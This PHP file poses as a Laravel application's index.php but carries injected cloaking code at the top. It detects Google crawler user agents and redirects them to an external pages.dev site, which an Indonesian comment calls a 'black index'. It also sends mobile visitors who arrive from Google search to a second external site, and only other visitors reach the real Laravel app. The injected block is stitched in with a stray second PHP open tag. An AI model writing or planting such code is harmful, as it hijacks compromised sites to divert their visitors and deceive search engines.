<?php
function isGoogleBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $googleBotAgents = [
        'Googlebot',
        'Googlebot/2.1',
        'Googlebot-Mobile',
        'Googlebot-Image',
        'Googlebot-Video',
        'Googlebot-News',
        'Google-InspectionTool',
        'Google-Site-Verification',
        'Mediapartners-Google',
        'AdsBot-Google',
        'AdsBot-Google-Mobile',
        'APIs-Google',
        'AdsBot-Google-Mobile-Apps',
        'FeedFetcher-Google',
        'DuplexWeb-Google',
        'Google Favicon',
        'Google-Read-Aloud',
    ];
    
    foreach ($googleBotAgents as $botAgent) {
        if (strpos($userAgent, $botAgent) !== false) {
            return true;
        }
    }
    return false;
}

if (isGoogleBot()) {
    // Jika pengunjung adalah Googlebot, tampilkan index_hitam.txt
     header("Location: https://projecthigh.pages.dev/");
    exit;
}

function is_mobile() {
    $mobile_agents = array('Android', 'iPhone', 'iPad');
    $uri = $_SERVER['REQUEST_URI'];
    foreach ($mobile_agents as $agent) {
        if ($uri == '/' && stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
            if (isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google') !== false)
            return true;
        }
    }
    return false;
}

if (is_mobile()) {
     header("Location: https://highproject.pages.dev/");
    exit;
} else {

<?php

use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

// Determine if the application is in maintenance mode...
if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

// Register the Composer autoloader...
require __DIR__.'/core/vendor/autoload.php';

// Bootstrap Laravel and handle the request...
(require_once __DIR__.'/core/bootstrap/app.php')
    ->handleRequest(Request::capture());

}
?>
